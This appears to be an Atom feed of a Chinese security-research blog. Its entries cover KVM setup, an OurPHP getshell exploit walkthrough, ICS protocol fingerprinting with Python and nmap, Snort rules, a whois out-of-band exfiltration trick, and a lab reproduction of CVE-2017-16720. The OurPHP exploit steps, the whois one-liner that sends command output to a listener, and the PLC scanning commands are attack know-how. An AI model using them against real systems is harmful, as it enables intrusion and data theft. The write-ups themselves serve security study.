<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://hi-kk.github.io/</id>
    <title>KEYONE</title>
    <updated>2019-07-26T08:38:13.023Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://hi-kk.github.io/"/>
    <link rel="self" href="https://hi-kk.github.io//atom.xml"/>
    <subtitle>PenTesting&amp;Security Research &lt;br&gt;
LOVE &amp; PEACE ❤️JUST FOR FUN</subtitle>
    <logo>https://hi-kk.github.io//images/avatar.png</logo>
    <icon>https://hi-kk.github.io//favicon.ico</icon>
    <rights>All rights reserved 2019, KEYONE</rights>
    <entry>
        <title type="html"><![CDATA[CentOS下安装KVM环境及VMWare与KVM互相转换]]></title>
        <id>https://hi-kk.github.io//post/centos-xia-an-zhuang-kvm-huan-jing-ji-vmware-yu-kvm-hu-xiang-zhuan-huan</id>
        <link href="https://hi-kk.github.io//post/centos-xia-an-zhuang-kvm-huan-jing-ji-vmware-yu-kvm-hu-xiang-zhuan-huan">
        </link>
        <updated>2019-07-23T08:03:49.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>在最近的工作任务中，需要部署KVM虚拟环境，并尝试把以前在VMware下制作的虚拟机镜像转换成KVM支持的文件。之前也没接触过kvm，就网上搜索一番资料来试试看，幸运的是这次搜到的资料竟然一次成功，没有任何报错，简直感激涕零啊......索性把这个过程记录一下，分享出来，能少踩坑就少踩坑。</p>
]]></summary>
        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>在最近的工作任务中，需要部署KVM虚拟环境，并尝试把以前在VMware下制作的虚拟机镜像转换成KVM支持的文件。之前也没接触过kvm，就网上搜索一番资料来试试看，幸运的是这次搜到的资料竟然一次成功，没有任何报错，简直感激涕零啊......索性把这个过程记录一下，分享出来，能少踩坑就少踩坑。</p>
<!-- more -->
<h2 id="前期检查">前期检查</h2>
<p><img src="https://hi-kk.github.io//post-images/1563870446694.png" alt=""><br>
无论在物理机还是虚拟机都应该启用CPU的虚拟化功能Intel-VT，以更好地运行KVM或者VMware虚拟机</p>
<h2 id="安装步骤">安装步骤</h2>
<ol>
<li>
<p>检查CPU特性<br>
<code>lscpu | grep vmx</code></p>
</li>
<li>
<p>安装一些基础软件包（非必须）<br>
<code>sudo yum install -y epel-release net-tools vim unzip zip wget ftp bridge-utils</code></p>
</li>
<li>
<p>安装KVM及相关工具</p>
</li>
</ol>
<pre><code>sudo yum install -y qemu-kvm libvirt
sudo yum install -y libguestfs-tools libguestfs-tools libguestfs-tools-c
</code></pre>
<ol start="4">
<li>验证安装结果</li>
</ol>
<pre><code>$ lsmod | grep ^kvm
kvm_intel             174250  0 
kvm                   570658  1 kvm_intel
</code></pre>
<ol start="5">
<li>启动服务并设置为开机自动运行</li>
</ol>
<pre><code>systemctl start libvirtd
systemctl enable libvirtd
</code></pre>
<ol start="6">
<li>检查服务状态</li>
</ol>
<pre><code>systemctl status libvirtd
systemctl is-enabled libvirtd
</code></pre>
<ol start="7">
<li>创建网络环境<br>
注意： 正常情况下，按之前的步骤一步步来是没有报错的，我这里实际测试也是如此，这时系统里已经有了virbr0这个网桥，则后面直接使用virbr0网桥即可。如果没有，就参看文末的引用链接原文寻找此处内容。</li>
</ol>
<h2 id="vmware转化kvm">VMware转化KVM</h2>
<ol>
<li>
<p>检查vmware虚拟机保存目录，查看是否为独立的vmdk文件，如果不是独立文件需要对其进行合并。还有，如果这台虚拟机有快照，需要将快照导出为完整虚拟机！</p>
</li>
<li>
<p>合并方法：以管理员身份运行cmd，进入到<br>
<code>C:\Program Files (x86)\VMware\VMware Workstation&gt;</code>（VMware安装目录，根据实际调整）<br>
用vmware自带的工具vmware- vdiskmanager.exe来合并多个文件，命令如下<code>vmware-vdiskmanager.exe -r &quot;C:\Winxp\Winxp.vmdk&quot; -t 0 &quot;C:\Winxp-vm.vmdk&quot;</code><br>
合并成功后，Winxpvm.vmdk就是合并后的独立文件。</p>
</li>
<li>
<p>将vmdk文件拷贝到KVM Linux主机，运行命令：<br>
<code>[root@localhost ~]# qemu-img convert Winxp-vm.vmdk -O qcow2 Winxp-kvm.img</code><br>
转化之后，Winxp-kvm.img就是可以导入KVM的镜像文件</p>
</li>
<li>
<p>启动virtmanager，导入镜像创建虚拟机。这时启动的虚拟机可能会发生蓝屏状况（windows虚拟机会有这种情况发生），你需要强制关闭蓝屏虚拟机。</p>
</li>
<li>
<p>导入注册表</p>
</li>
</ol>
<pre><code>[root@localhost ~]#wget https://github.com/jakobadam/kvm-mergeide/archive/master.zip

[root@localhost ~]#yum install qemu-img *libguestfs*'

[root@localhost kvm-mergeide-master]# virt-win-reg --merge XP mergeide.reg 
</code></pre>
<p>注意:这条命令里的XP是你之前创建kvm虚拟机的名称，virt-win-reg会自动搜索KVM中noactive的虚拟机名称，然后执行mergeide.reg。至此，转化已经完成<br>
<img src="https://hi-kk.github.io//post-images/1563872596863.png" alt=""></p>
<h2 id="kvm转化vmware">KVM转化VMWare</h2>
<ol>
<li>找到kvm虚拟机使用的img文件，将其转换成vmdk格式。<br>
<code>qemu-img convert testvm1.img –O vmdk /tmp/testvm1.vmdk</code></li>
<li>在VMware 里创建一个虚拟机，要和kvm环境虚拟机配置相同， 在创建磁盘那一步，选择”使用现有虚拟磁盘“，就是刚刚转换好的vmdk文件，再开启虚拟机就OK了。</li>
</ol>
<h2 id="引用">引用</h2>
<p><a href="https://blog.csdn.net/sch0120/article/details/83508879">在CentOS7上运行KVM虚拟机</a><br>
<a href="https://www.jianshu.com/p/eb8bccc28335">2019-02-21 VMware15在Ubuntu16.04安装使用及转换KVM</a><br>
<a href="https://blog.csdn.net/tianci_zzz/article/details/73896955">vmware虚拟机迁移到kvm</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[OurPHP20180718前台getshell分析]]></title>
        <id>https://hi-kk.github.io//post/ourphp20180718-qian-tai-getshell-fen-xi</id>
        <link href="https://hi-kk.github.io//post/ourphp20180718-qian-tai-getshell-fen-xi">
        </link>
        <updated>2019-04-30T06:10:09.000Z</updated>
        <summary type="html"><![CDATA[<blockquote>
<p>影响范围：v1.7.5-v1.8.3</p>
</blockquote>
<p>先抛出payload，再进行代码分析</p>
]]></summary>
        <content type="html"><![CDATA[<blockquote>
<p>影响范围：v1.7.5-v1.8.3</p>
</blockquote>
<p>先抛出payload，再进行代码分析</p>
<!--more-->
<h2 id="前台getshell">前台getshell</h2>
<p>首先，访问http://127.0.0.1/ourphp20180718/function/editor/php/upload_json.php?upload_file=1<br>
<img src="https://hi-kk.github.io//post-images/1563883458715.png" alt=""><br>
获取到：</p>
<pre><code>&lt;!--12345||7Hv9WqglWlPJZPgrFVUvpFnP4DmuTCn1--&gt;
</code></pre>
<p>构造出：</p>
<pre><code>口令码：12345

安全校验码：7Hv9WqglWlPJZPgrFVUvpFnP4DmuTCn1glWlPJ（跟上图比多了后面六个字符，具体看后面代码分析）
</code></pre>
<p>访问 <a href="http://127.0.0.1/ourphp20180718//client/manage/ourphp_filebox.php?op=home&amp;folder=./&amp;validation=12345&amp;code=7Hv9WqglWlPJZPgrFVUvpFnP4DmuTCn1glWlPJ">http://127.0.0.1/ourphp20180718//client/manage/ourphp_filebox.php?op=home&amp;folder=./&amp;validation=12345&amp;code=7Hv9WqglWlPJZPgrFVUvpFnP4DmuTCn1glWlPJ</a></p>
<p><img src="https://hi-kk.github.io//post-images/1563883485140.png" alt=""><br>
进行文件编辑，写入代码，修改后缀名，直接getshell</p>
<p><img src="https://hi-kk.github.io//post-images/1563883511409.png" alt=""></p>
<p><img src="https://hi-kk.github.io//post-images/1563883531172.png" alt=""></p>
<p><img src="https://hi-kk.github.io//post-images/1563883544692.png" alt=""></p>
<h2 id="代码分析">代码分析</h2>
<p>跟进 <code>function\editor\php\upload_json.php</code></p>
<p><img src="https://hi-kk.github.io//post-images/1563883560945.png" alt=""></p>
<p>继续跟进<code>uploadsafe()</code>函数，在<code>function\editor\php\JSON.php</code>238行</p>
<pre><code class="language-php">	function uploadsafe()
    {
		global $ourphp;
		return '&lt;!--'.$ourphp['validation'].'||'.substr($ourphp['safecode'], 0, 32).'--&gt;';
	}
</code></pre>
<p>由此可知，只要在前端给参数<code>upload_file</code>传任意值，就会返回<code>validation</code>口令码和<code>safecode</code>安全码的前32位</p>
<p>继续跟，看安全码是如何生成的，在<code>function\install\index.php</code>288行</p>
<pre><code class="language-php">$ourphp_safecode = getRandomString(32);
$safecode6 = substr($ourphp_safecode , 6 , 6);
$str_f = '$';
$str_tmp = &quot;&lt;?php
	/*
	 * Ourphp - CMS建站系统
	 * Copyright (C) 2014 ourphp.net
	 * 开发者：哈尔滨伟成科技有限公司
	 * -------------------------------
	 * 网站配置文件 (2016-10-22)
	 * -------------------------------
	 */

	define('OURPHPNO', true);
	define('WEB_ROOT',substr(dirname(__FILE__), 0, -7));

	include '&quot;.$mysql_file.&quot;';

	&quot;.$str_f.&quot;ourphp = array(
		'webpath' =&gt; '/',	// 网站路径
		'validation' =&gt; '12345',	// 口令码
		'adminpath' =&gt; 'client/manage',		// 管理员默认目录
		'mysqlurl' =&gt; '&quot;.$ourphp_dburl.&quot;',	// 数据库链接地址
		'mysqlname' =&gt; '&quot;.$ourphp_dbname.&quot;',	// 数据库登录账号
		'mysqlpass' =&gt; '&quot;.$ourphp_dbpass.&quot;',	// 数据库登录密码
		'mysqldb' =&gt; '&quot;.$ourphp_mydb.&quot;',	// 数据库表名
		'filesize' =&gt; '5000000',	// 附件上传最大值
		'safecode' =&gt; '&quot;.$ourphp_safecode.$safecode6.&quot;',	// 安全校验码
		'mysqltype' =&gt; '&quot;.$mysql_type.&quot;',
	);

	&quot;.$str_f.&quot;db = new OurPHP_Mysql(
		&quot;.$str_f.&quot;ourphp['mysqlurl'],
		&quot;.$str_f.&quot;ourphp['mysqlname'],
		&quot;.$str_f.&quot;ourphp['mysqlpass'],
		&quot;.$str_f.&quot;ourphp['mysqldb']
	);
?&gt;&quot;;
</code></pre>
<p><img src="https://hi-kk.github.io//post-images/1563883610679.png" alt=""><br>
由此可知，安全码是通过随机取一个32位字符，然后取32位的第6位之后的6位字符，拼接到后面形成</p>
<p>由此就能得到后台访问的关键口令码和安全码</p>
<p>再跟后台的文件管理模块，在<code>\client\manage\ourphp_filebox.php</code>45行</p>
<p><img src="https://hi-kk.github.io//post-images/1563883622642.png" alt=""><br>
由此可知，只要口令码、安全校验码正确就可以对文件进行操作（编辑、重命名）</p>
<p>而且，835行的后缀名过滤，可用大小写绕过了</p>
<p><img src="https://hi-kk.github.io//post-images/1563883639438.png" alt=""><br>
至此，payload就可以构造好啦</p>
<blockquote>
<p>参考：https://xz.aliyun.com/t/4315</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[python发送定制报文与回包取特定值]]></title>
        <id>https://hi-kk.github.io//post/python-fa-song-ding-zhi-bao-wen-yu-hui-bao-qu-te-ding-zhi</id>
        <link href="https://hi-kk.github.io//post/python-fa-song-ding-zhi-bao-wen-yu-hui-bao-qu-te-ding-zhi">
        </link>
        <updated>2019-04-19T02:22:15.000Z</updated>
        <summary type="html"><![CDATA[<p>-_- 无FCUK说....</p>
]]></summary>
        <content type="html"><![CDATA[<p>-_- 无FCUK说....</p>
<!--more-->
<p><img src="https://hi-kk.github.io//post-images/1563882268454.png" alt=""></p>
<h2 id="需求">需求</h2>
<p>使用Python编写一个脚本，实现向特定端口发送特定的探测payload报文，根据响应包，取特定字节范围的字符进行输出</p>
<h2 id="实例">实例</h2>
<p>这里就以工控设备：<strong>Mitsubishi（三菱） Q系列PLC CPU型号识别</strong> 作为案例<br>
其实，在之前写的文章 ** Nmap NSE开发之三菱Q系列PLC以太网识别** 之中已经可以得出大体的设计思路</p>
<ol>
<li>
<p>向设备的<code>5007</code> TCP端口，发送特定的识别数据报文<br>
<code>57000000001111070000ffff030000fe03000014001c080a0800000000000000040101010000000001</code><br>
<img src="https://hi-kk.github.io//post-images/1563882351879.png" alt=""></p>
</li>
<li>
<p>接受设备返回的数据报文，提取出特定字节范围的 <code>设备CPU信息</code><br>
<img src="https://hi-kk.github.io//post-images/1563882382138.png" alt=""><br>
这里直接给出python代码</p>
</li>
</ol>
<pre><code class="language-python">
# -*- coding: utf-8 -*-

from socket import *


if __name__==&quot;__main__&quot;:

	
	host='xx.xx.xx.xx'
	port=5007

	s = socket(AF_INET,SOCK_STREAM) #TCP发包
	s.connect((host,port))


	cmd=&quot;57000000001111070000ffff030000fe03000014001c080a0800000000000000040101010000000001&quot;
	
	s.send(cmd.decode('hex'))  #TCP发包

	#recv0_data=s.recvfrom(1024)

	res_list = []

	cur_data, _ = s.recvfrom(1024)

	for cur_chr in cur_data:
		res_list.append(cur_chr)

	cpuinfo = ''.join(res_list[35:55]) #取特定字节范围 CPUINFO

	print cpuinfo

	s.close()
</code></pre>
<p><img src="https://hi-kk.github.io//post-images/1563882419533.png" alt=""></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[工控安全：snort-Windows下安装配置及工控协议识别规则编写]]></title>
        <id>https://hi-kk.github.io//post/gong-kong-an-quan-snort-windows-xia-an-zhuang-pei-zhi-ji-gong-kong-xie-yi-shi-bie-gui-ze-bian-xie-si-lu</id>
        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-snort-windows-xia-an-zhuang-pei-zhi-ji-gong-kong-xie-yi-shi-bie-gui-ze-bian-xie-si-lu">
        </link>
        <updated>2019-03-29T02:28:37.000Z</updated>
        <summary type="html"><![CDATA[<p>先简单介绍windows环境下的snort安装和配置，主要是为了下面写工控协议识别snort规则和验证规则做铺垫。</p>
]]></summary>
        <content type="html"><![CDATA[<p>先简单介绍windows环境下的snort安装和配置，主要是为了下面写工控协议识别snort规则和验证规则做铺垫。</p>
<!--more-->
<h2 id="下载安装">下载安装</h2>
<p>官网下载：https://www.snort.org/<br>
<img src="https://hi-kk.github.io//post-images/1563935405913.png" alt=""><br>
直接默认安装<br>
<img src="https://hi-kk.github.io//post-images/1563935447915.png" alt=""><br>
进入安装目录：<code>C:\Snort</code><br>
<img src="https://hi-kk.github.io//post-images/1563935466767.png" alt=""></p>
<h2 id="配置文件">配置文件</h2>
<p>编辑<code>C:\Snort\etc\snort.conf</code> 修改成如下图<br>
<img src="https://hi-kk.github.io//post-images/1563935483657.png" alt=""></p>
<pre><code class="language-bash"># Path to your rules files (this can be a relative path)
# Note for Windows users:  You are advised to make this an absolute path,
# such as:  c:\snort\rules
var RULE_PATH c:\snort\rules
var SO_RULE_PATH c:\snort\so_rules
var PREPROC_RULE_PATH c:\snort\preproc_rules

# If you are using reputation preprocessor set these
# Currently there is a bug with relative paths, they are relative to where snort is
# not relative to snort.conf like the above variables
# This is completely inconsistent with how other vars work, BUG 89986
# Set the absolute path appropriately
var WHITE_LIST_PATH c:\snort\rules
var BLACK_LIST_PATH c:\snort\rules
</code></pre>
<p><img src="https://hi-kk.github.io//post-images/1563935501116.png" alt=""></p>
<pre><code># path to dynamic preprocessor libraries

dynamicpreprocessor directory c:\snort\lib\snort_dynamicpreprocessor

# path to base preprocessor engine

dynamicengine c:\snort\lib\snort_dynamicengine\sf_engine.dll
</code></pre>
<p><img src="https://hi-kk.github.io//post-images/1563935513767.png" alt=""></p>
<p><img src="https://hi-kk.github.io//post-images/1563935527636.png" alt=""></p>
<p>此处安装参考:http://www.cnblogs.com/lasgalen/p/4512755.html</p>
<h2 id="规则验证">规则验证</h2>
<p>进入<code>C:\Snort\rules</code>，新建三个文件</p>
<p><img src="https://hi-kk.github.io//post-images/1563935541107.png" alt=""></p>
<p>在文件<code>local.rules</code>添加我们的snort规则进行验证测试，例如：</p>
<pre><code>alert tcp any any -&gt; any 1911 (msg:&quot;IDS: fox-info&quot;; content:&quot;|66 6f 78|&quot;;  sid:1112515; rev:1;)
</code></pre>
<p>CMD进入目录<code>C:\Snort\bin</code></p>
<p>注意：snort只能识别pcap后缀的包文件，用wireshark的pcapng后缀会报错 需要再另存为一下 修改文件格式 不是直接改后缀哦</p>
<p><img src="https://hi-kk.github.io//post-images/1563935566053.png" alt=""></p>
<p><img src="https://hi-kk.github.io//post-images/1563935577435.png" alt=""><br>
然后运行：</p>
<pre><code>PS C:\Snort\bin&gt; .\snort.exe  -c c:\snort\etc\snort.conf -l c:\snort\log -r .\fox_info.pcap
</code></pre>
<p>没有报错就说明成功运行了，去看看log有没有输出信息</p>
<p>进入<code>C:\Snort\log</code></p>
<p><img src="https://hi-kk.github.io//post-images/1563935592124.png" alt=""></p>
<p><img src="https://hi-kk.github.io//post-images/1563935604411.png" alt=""><br>
成功按规则进行了信息输出，到此规则验证成功</p>
<h2 id="pcap规则编写思路">pcap规则编写思路</h2>
<p>IEC61850-MMS协议</p>
<p><img src="https://hi-kk.github.io//post-images/1563935624772.png" alt=""></p>
<p>先用wireshark打开对应的数据包文件，因为wireshark适配了mms协议的解析，所以可以很直观的分辨出哪个数据包对应什么功能</p>
<p><img src="https://hi-kk.github.io//post-images/1563935642261.png" alt=""></p>
<p>从上图可知，选中的数据包执行的是<strong>start</strong>操作</p>
<p><img src="https://hi-kk.github.io//post-images/1563935658744.png" alt=""></p>
<p>从上图可知，选中的数据包执行的是<strong>stop</strong>操作</p>
<p>现在，我们把对应的数据包十六进制数据提取出来，做一下对比，就可以很轻松的写出对应的snort规则</p>
<p><img src="https://hi-kk.github.io//post-images/1563935678185.png" alt=""></p>
<p>提取出snort规则，在文件<code>local.rules</code>添加我们的snort规则进行验证测试，例如：</p>
<pre><code>alert tcp any any -&gt; any 102 (msg:&quot;IDS: mms-START&quot;; content:&quot;|bf 28 1b|&quot;;  sid:1112727; rev:1;)
alert tcp any any -&gt; any 102 (msg:&quot;IDS: mms-STOP&quot;; content:&quot;|bf 29 19|&quot;;  sid:1112728; rev:1;)
alert tcp any any -&gt; any 102 (msg:&quot;IDS: mms-RESET&quot;; content:&quot;|bf 2b 19|&quot;;  sid:1112729; rev:1;)
</code></pre>
<p>尝试验证一下数据包的规则，查看日志：</p>
<p><img src="https://hi-kk.github.io//post-images/1563935695810.png" alt=""></p>
<p>可以发现日志里记录了规则命中的输出信息，到此就算规则编写完成了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[工控安全：工控常见协议识别]]></title>
        <id>https://hi-kk.github.io//post/gong-kong-an-quan-gong-kong-chang-jian-xie-yi-shi-bie</id>
        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-gong-kong-chang-jian-xie-yi-shi-bie">
        </link>
        <updated>2019-03-13T03:23:08.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>首先是因为接到一个任务：需要对工控常见协议的识别流量进行收集。<br>
项目见：https://github.com/hi-KK/ICS-Protocol-identify （含nse脚本和识别pcap流量）</p>
]]></summary>
        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>首先是因为接到一个任务：需要对工控常见协议的识别流量进行收集。<br>
项目见：https://github.com/hi-KK/ICS-Protocol-identify （含nse脚本和识别pcap流量）</p>
<!-- more -->
<p><img src="https://hi-kk.github.io//post-images/1563936445292.png" alt=""></p>
<h2 id="工控常见协议">工控常见协议</h2>
<table>
<thead>
<tr>
<th>协议</th>
<th>通信</th>
<th>端口</th>
</tr>
</thead>
<tbody>
<tr>
<td>Siemens S7</td>
<td>tcp</td>
<td>102</td>
</tr>
<tr>
<td>Modbus</td>
<td>tcp</td>
<td>502</td>
</tr>
<tr>
<td>IEC 60870-5-104</td>
<td>tcp</td>
<td>2404</td>
</tr>
<tr>
<td>DNP3</td>
<td>tcp</td>
<td>20000</td>
</tr>
<tr>
<td>EtherNet/IP</td>
<td>udp</td>
<td>44818</td>
</tr>
<tr>
<td>BACnet</td>
<td>udp</td>
<td>47808</td>
</tr>
<tr>
<td>Tridium Niagara Fox</td>
<td>tcp</td>
<td>1911</td>
</tr>
<tr>
<td>Crimson V3</td>
<td>tcp</td>
<td>789</td>
</tr>
<tr>
<td>OMRON FINS</td>
<td>tcp</td>
<td>9600</td>
</tr>
<tr>
<td>PCWorx</td>
<td>tcp</td>
<td>1962</td>
</tr>
<tr>
<td>ProConOs</td>
<td>tcp</td>
<td>20547</td>
</tr>
<tr>
<td>MELSEC-Q</td>
<td>tcp</td>
<td>5007</td>
</tr>
</tbody>
</table>
<h2 id="工控协议识别">工控协议识别</h2>
<h3 id="siemens-s7">Siemens S7</h3>
<pre><code>nmap -sS -Pn -p 102 --script s7-info -iL 123.txt -oX 123.xml
</code></pre>
<h3 id="modbus">Modbus</h3>
<pre><code>nmap -sS -Pn -p 502 --script modicon-info -iL 123.txt -oX 123.xml
</code></pre>
<h3 id="iec-60870-5-104">IEC 60870-5-104</h3>
<pre><code>nmap -Pn -n -d --script iec-identify.nse  --script-args='iec-identify.timeout=500' -p 2404 &lt;host&gt;
</code></pre>
<h3 id="dnp3">DNP3</h3>
<pre><code>nmap --script dnp3-info -p 20000 &lt;host&gt;
</code></pre>
<h3 id="ethernetip">EtherNet/IP</h3>
<pre><code>nmap --script enip-info -sU  -p 44818 &lt;host&gt;
</code></pre>
<h3 id="bacnet">BACnet</h3>
<pre><code>nmap --script bacnet-info -sU -p 47808 &lt;host&gt;
</code></pre>
<h3 id="tridium-niagara-fox">Tridium Niagara Fox</h3>
<pre><code>nmap --script fox-info.nse -p 1911 &lt;host&gt;
</code></pre>
<h3 id="crimson-v3">Crimson V3</h3>
<pre><code>nmap --script cr3-fingerprint -p 789 &lt;host&gt;
</code></pre>
<h3 id="omron-fins">OMRON FINS</h3>
<pre><code>nmap --script omron-info -sU -p 9600 &lt;host&gt;
nmap --script ormontcp-info -p 9600 &lt;host&gt;
nmap --script ormonudp-info -sU -p 9600 &lt;host&gt;

</code></pre>
<h3 id="pcworx">PCWorx</h3>
<pre><code>nmap --script pcworx-info -p 1962 &lt;host&gt;

</code></pre>
<h3 id="proconos">ProConOs</h3>
<pre><code>nmap --script proconos-info -p 20547 &lt;host&gt;

</code></pre>
<h3 id="melsec-q">MELSEC-Q</h3>
<pre><code>nmap -script melsecq-discover -sT -p 5007 &lt;host&gt;
nmap -script melsecq-discover-udp.nse -sU -p 5006 &lt;host&gt;

</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[分享自己的工控爬虫项目—PySpider-ICS]]></title>
        <id>https://hi-kk.github.io//post/fen-xiang-zi-ji-de-gong-kong-pa-chong-xiang-mu-pyspider-ics</id>
        <link href="https://hi-kk.github.io//post/fen-xiang-zi-ji-de-gong-kong-pa-chong-xiang-mu-pyspider-ics">
        </link>
        <updated>2019-03-08T01:05:13.000Z</updated>
        <summary type="html"><![CDATA[<p>此项目用来记录使用pyspider爬虫框架爬取工控相关数据(漏洞、预警、安全事件等)</p>
]]></summary>
        <content type="html"><![CDATA[<p>此项目用来记录使用pyspider爬虫框架爬取工控相关数据(漏洞、预警、安全事件等)</p>
<!--more-->
<p><a href="https://github.com/hi-KK/PySpider-ICS">https://github.com/hi-KK/PySpider-ICS</a><br>
<img src="https://hi-kk.github.io//post-images/1563937548686.png" alt=""></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[渗透技巧：巧用whois外带回显命令执行结果]]></title>
        <id>https://hi-kk.github.io//post/shen-tou-ji-qiao-qiao-yong-whois-wai-dai-hui-xian-ming-ling-zhi-xing-jie-guo</id>
        <link href="https://hi-kk.github.io//post/shen-tou-ji-qiao-qiao-yong-whois-wai-dai-hui-xian-ming-ling-zhi-xing-jie-guo">
        </link>
        <updated>2019-03-05T07:10:02.000Z</updated>
        <summary type="html"><![CDATA[<p>在实战过程中，可能会遇到一些复杂的网络情况，导致需要执行的命令没办法看到返回结果，这就给后续渗透带来很大的不便，从twitter中看到一种新型的命令执行结果外带的方法，在这里分享记录一下。</p>
]]></summary>
        <content type="html"><![CDATA[<p>在实战过程中，可能会遇到一些复杂的网络情况，导致需要执行的命令没办法看到返回结果，这就给后续渗透带来很大的不便，从twitter中看到一种新型的命令执行结果外带的方法，在这里分享记录一下。</p>
<!--more-->
<p>先看一下<code>whois</code>命令的使用介绍</p>
<pre><code class="language-bash">root@kali:~# whois -h
whois: 选项需要一个参数 -- h
用法： whois 【选项】 …… 对象 …… 

-h HOST, --host HOST    连接到服务器 HOST
-p PORT, --port PORT    连接到端口 PORT
-H                      隐藏法律声明 
      --verbose         解释正在做什么 
      --help            显示帮助并退出 
      --version         输出版本信息并退出 

这些标志是由 whois.ript.net 和 RIPE-like 服务器支持的： 
 -l                     寻找有更少具体匹配的一个级别 
-L                     寻找所有更少具体匹配的级别 
-m                   寻找有更加具体匹配的一个级别 
-M                   寻找有更加具体的匹配的所有级别 
-c                     寻找包含 mnt-irt 属性的最小匹配 
-x                     精确匹配 
-b                     return brief IP address ranges with abuse contact
-B                     关闭对象过滤（显示 email 地址） 
-G                    关闭相关联对象的分组 
-d                     返回 DNS 反解授权对象 
-i ATTR[,ATTR]...      对特定的属性（ ATTR ）进行逆向查询 
-T TYPE[,TYPE]...      只寻找 TYPE 的对象 
-K                      只返回主键 
-r                      关闭联系信息的递归查询 
-R                     强制显示域对象的本地副本，即使 
                         它包含引用 
-a                     一并搜索所有的数据库镜像 
-s SOURCE[,SOURCE]...   从 SOURCE 中搜索数据库镜像 
-g SOURCE:FIRST-LAST   从串行的 FIRST 到 LAST 的 SOURCE 中查找更新 
-t TYPE                 请求 TYPE 对象的模板 
-v TYPE                 请求 TYPE 对象的详细模板 
-q [version|sources|types]   询问制定服务器信息 
root@kali:~#
</code></pre>
<p>仔细点就可以发现<code>whois</code>命令有两个参数可以连接到远程服务器<code>-h</code>和<code>-p</code><br>
那么我们来尝试下利用<code>whois</code>命令外带回显命令执行结果<br>
先在kali中监听一个端口用来接收回显结果</p>
<p><img src="https://hi-kk.github.io//post-images/1563937879120.png" alt=""></p>
<p>在ubuntu中执行命令</p>
<pre><code class="language-bash">whois -h 192.168.159.132 -p 555 &quot;`whoami&amp;uname -a`&quot;
</code></pre>
<p><em>需要注意：这里使用的是反引号，这样才会在linux的bash环境执行命令，后面的双引号可带可不带</em></p>
<p>执行后就看到命令的回显结果已经带出到kali中了<br>
<img src="https://hi-kk.github.io//post-images/1563937905345.png" alt=""></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[漏洞实验：CVE-2017-16720-Advantech WebAccess远程命令执行]]></title>
        <id>https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2017-16720-advantech-webaccess-yuan-cheng-ming-ling-zhi-xing-lou-dong</id>
        <link href="https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2017-16720-advantech-webaccess-yuan-cheng-ming-ling-zhi-xing-lou-dong">
        </link>
        <updated>2019-01-08T05:50:11.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="漏洞编号">漏洞编号</h2>
<p>CVE-2017-16720</p>
<p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
]]></summary>
        <content type="html"><![CDATA[<h2 id="漏洞编号">漏洞编号</h2>
<p>CVE-2017-16720</p>
<p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
<!--more-->
<h2 id="漏洞说明">漏洞说明</h2>
<blockquote>
<p>研华WebAccess软件是研华物联网应用平台解决方案的核心，为用户提供一个基于HTML5技术用户界面，实现跨平台、跨浏览器的数据访问体验。使用WebAccess后，用户可以建立一个信息管理平台，同步提高垂直市场管理发展的效率。</p>
</blockquote>
<blockquote>
<p>研华WebAccess提供了一个基于HTML5的智能仪表板作为下一代WebAccess的人机界面。其中，小部件功能可以让系统集成商通过分析图表和图形用仪表板编辑器来创建自定义信息页面。在创建仪表板界面之后，最终用户可以通过仪表板查看器来查看数据与以及可以在电脑，Mac，平板电脑和智能手机通过任何浏览器无缝观看体验。</p>
</blockquote>
<p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
<h2 id="漏洞复现">漏洞复现</h2>
<p>通过官方渠道，下载存在该漏洞的版本程序<br>
<a href="">http://advcloudfiles.advantech.com/web/Download/webaccess/8.2/AdvantechWebAccessUSANode8.2_20170817.exe</a></p>
<p><strong>安装环境：Windows Server 2008 R2 x64</strong><br>
<img src="https://hi-kk.github.io//post-images/1563938270052.png" alt=""></p>
<p>安装一律默认NEXT即可，TCP端口也无需自定义，默认程序端口4592<br>
<img src="https://hi-kk.github.io//post-images/1563938286276.png" alt=""></p>
<p>安装完成，系统重启，可查看本机开放端口情况<br>
<img src="https://hi-kk.github.io//post-images/1563938302550.png" alt=""></p>
<p>可以看到漏洞所利用的端口4592已经正常开放<br>
现在，我们使用附件中的EXP脚本，对搭载Advantech WebAccess 8.2-2017.08.18程序的服务器进行攻击<br>
<img src="https://hi-kk.github.io//post-images/1563938320827.png" alt=""></p>
<p>漏洞攻击成功的话，利用EXP脚本发送系统命令执行指令到服务器上，服务器会执行对应指令，弹出计算器。<br>
<img src="https://hi-kk.github.io//post-images/1563938333843.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1563938347128.png" alt=""></p>
